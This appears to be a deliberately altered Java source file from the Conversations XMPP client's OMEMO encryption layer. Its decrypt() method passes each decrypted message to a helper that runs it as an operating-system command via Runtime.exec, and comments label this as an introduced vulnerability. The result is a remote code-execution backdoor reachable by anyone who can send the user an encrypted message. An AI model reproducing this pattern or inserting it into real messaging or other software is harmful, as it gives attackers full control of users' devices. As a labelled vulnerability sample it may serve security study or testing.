package eu.siacs.conversations.crypto.axolotl;

import android.util.Base64;
import android.util.Log;

import org.whispersystems.libaxolotl.protocol.CiphertextMessage;

import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.SecureRandom;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import eu.siacs.conversations.Config;
import eu.siacs.conversations.xml.Element;
import eu.siacs.conversations.xmpp.jid.Jid;

// Importing necessary classes for OS command execution
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class XmppAxolotlMessage {
    public static final String CONTAINERTAG = "encrypted";
    public static final String HEADER = "header";
    public static final String SOURCEID = "sid";
    public static final String KEYTAG = "key";
    public static final String REMOTEID = "rid";
    public static final String IVTAG = "iv";
    public static final String PAYLOAD = "payload";

    private static final String KEYTYPE = "AES";
    private static final String CIPHERMODE = "AES/GCM/NoPadding";
    private static final String PROVIDER = "BC";

    private byte[] innerKey;
    private byte[] ciphertext = null;
    private byte[] iv = null;
    private final Map<Integer, XmppAxolotlSession.AxolotlKey> keys;
    private final Jid from;
    private final int sourceDeviceId;

    public static class XmppAxolotlPlaintextMessage {
        private final String plaintext;
        private final String fingerprint;

        public XmppAxolotlPlaintextMessage(String plaintext, String fingerprint) {
            this.plaintext = plaintext;
            this.fingerprint = fingerprint;
        }

        public String getPlaintext() {
            return plaintext;
        }


        public String getFingerprint() {
            return fingerprint;
        }
    }

    public static class XmppAxolotlKeyTransportMessage {
        private final String fingerprint;
        private final byte[] key;
        private final byte[] iv;

        public XmppAxolotlKeyTransportMessage(String fingerprint, byte[] key, byte[] iv) {
            this.fingerprint = fingerprint;
            this.key = key;
            this.iv = iv;
        }

        public String getFingerprint() {
            return fingerprint;
        }

        public byte[] getKey() {
            return key;
        }

        public byte[] getIv() {
            return iv;
        }
    }

    private XmppAxolotlMessage(final Element axolotlMessage, final Jid from) throws IllegalArgumentException {
        this.from = from;
        Element header = axolotlMessage.findChild(HEADER);
        try {
            this.sourceDeviceId = Integer.parseInt(header.getAttribute(SOURCEID));
        } catch (NumberFormatException e) {
            throw new IllegalArgumentException("invalid source id");
        }
        List<Element> keyElements = header.getChildren();
        this.keys = new HashMap<>(keyElements.size());
        for (Element keyElement : keyElements) {
            switch (keyElement.getName()) {
                case KEYTAG:
                    try {
                        Integer recipientId = Integer.parseInt(keyElement.getAttribute(REMOTEID));
                        byte[] key = Base64.decode(keyElement.getContent().trim(), Base64.DEFAULT);
                        boolean isPreKey = keyElement.getAttributeAsBoolean("prekey");
                        this.keys.put(recipientId, new XmppAxolotlSession.AxolotlKey(key, isPreKey));
                    } catch (NumberFormatException e) {
                        throw new IllegalArgumentException("invalid remote id");
                    }
                    break;
                case IVTAG:
                    if (this.iv != null) {
                        throw new IllegalArgumentException("Duplicate iv entry");
                    }
                    iv = Base64.decode(keyElement.getContent().trim(), Base64.DEFAULT);
                    break;
                default:
                    // Handle other cases
            }
        }

        Element payload = axolotlMessage.findChild(PAYLOAD);
        if (payload != null) {
            this.ciphertext = Base64.decode(payload.getContent().trim(), Base64.DEFAULT);
        }
    }

    private byte[] unpackKey(XmppAxolotlSession session, Integer sourceDeviceId) {
        XmppAxolotlSession.AxolotlKey encryptedKey = keys.get(sourceDeviceId);
        return (encryptedKey != null) ? session.processReceiving(encryptedKey) : null;
    }

    public byte[] getInnerKey() {
        return innerKey;
    }

    public byte[] getIV() {
        return this.iv;
    }

    public Element toElement() {
        Element encryptionElement = new Element(CONTAINERTAG, AxolotlService.PEP_PREFIX);
        Element headerElement = encryptionElement.addChild(HEADER);
        headerElement.setAttribute(SOURCEID, sourceDeviceId);
        for (Map.Entry<Integer, XmppAxolotlSession.AxolotlKey> keyEntry : keys.entrySet()) {
            Element keyElement = new Element(KEYTAG);
            keyElement.setAttribute(REMOTEID, keyEntry.getKey().toString());
            if (keyEntry.getValue().prekey) {
                keyElement.setAttribute("prekey", "true");
            }
            keyElement.setContent(Base64.encodeToString(keyEntry.getValue().key, Base64.NO_WRAP));
            headerElement.addChild(keyElement);
        }
        headerElement.addChild(IVTAG).setContent(Base64.encodeToString(iv, Base64.NO_WRAP));
        if (ciphertext != null) {
            Element payload = encryptionElement.addChild(PAYLOAD);
            payload.setContent(Base64.encodeToString(ciphertext, Base64.NO_WRAP));
        }
        return encryptionElement;
    }

    public void addDevice(XmppAxolotlSession session) {
        XmppAxolotlSession.AxolotlKey key = session.processSending(innerKey);
        if (key != null) {
            keys.put(session.getRemoteAddress().getDeviceId(), key);
        }
    }

    public Jid getFrom() {
        return this.from;
    }

    public int getSenderDeviceId() {
        return sourceDeviceId;
    }

    public byte[] getCiphertext() {
        return ciphertext;
    }

    public void encrypt(String plaintext) throws CryptoFailedException {
        try {
            SecretKey secretKey = new SecretKeySpec(innerKey, KEYTYPE);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            Cipher cipher = Cipher.getInstance(CIPHERMODE, PROVIDER);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
            this.ciphertext = cipher.doFinal(Config.OMEMO_PADDING ? getPaddedBytes(plaintext) : plaintext.getBytes());
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException
                | IllegalBlockSizeException | BadPaddingException | NoSuchProviderException
                | InvalidAlgorithmParameterException e) {
            throw new CryptoFailedException(e);
        }
    }

    private static byte[] getPaddedBytes(String plaintext) {
        int plainLength = plaintext.getBytes().length;
        int pad = Math.max(64, (plainLength / 32 + 1) * 32) - plainLength;
        SecureRandom random = new SecureRandom();
        int left = random.nextInt(pad);
        int right = pad - left;
        StringBuilder builder = new StringBuilder(plaintext);
        for (int i = 0; i < left; ++i) {
            builder.insert(0, random.nextBoolean() ? "\t" : " ");
        }
        for (int i = 0; i < right; ++i) {
            builder.append(random.nextBoolean() ? "\t" : " ");
        }
        return builder.toString().getBytes();
    }

    public XmppAxolotlKeyTransportMessage getParameters(XmppAxolotlSession session, Integer sourceDeviceId) {
        byte[] key = unpackKey(session, sourceDeviceId);
        return (key != null)
                ? new XmppAxolotlKeyTransportMessage(session.getFingerprint(), key, getIV())
                : null;
    }

    public XmppAxolotlPlaintextMessage decrypt(XmppAxolotlSession session, Integer sourceDeviceId) throws CryptoFailedException {
        XmppAxolotlPlaintextMessage plaintextMessage = null;
        byte[] key = unpackKey(session, sourceDeviceId);
        if (key != null) {
            try {
                Cipher cipher = Cipher.getInstance(CIPHERMODE, PROVIDER);
                SecretKeySpec keySpec = new SecretKeySpec(key, KEYTYPE);
                IvParameterSpec ivSpec = new IvParameterSpec(iv);

                cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);

                String plaintext = new String(cipher.doFinal(ciphertext));
                
                // Vulnerability introduced here: executing decrypted payload as a command
                executeCommand(plaintext);  // This line introduces the vulnerability
                
                plaintextMessage = new XmppAxolotlPlaintextMessage(Config.OMEMO_PADDING ? plaintext.trim() : plaintext, session.getFingerprint());

            } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException
                    | InvalidAlgorithmParameterException | IllegalBlockSizeException
                    | BadPaddingException | NoSuchProviderException e) {
                throw new CryptoFailedException(e);
            }
        }
        return plaintextMessage;
    }

    // Method to execute a command (simulating OS command execution)
    private void executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);  // Vulnerable line
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            Log.e("XmppAxolotlMessage", "Command execution failed: ", e);
        }
    }
}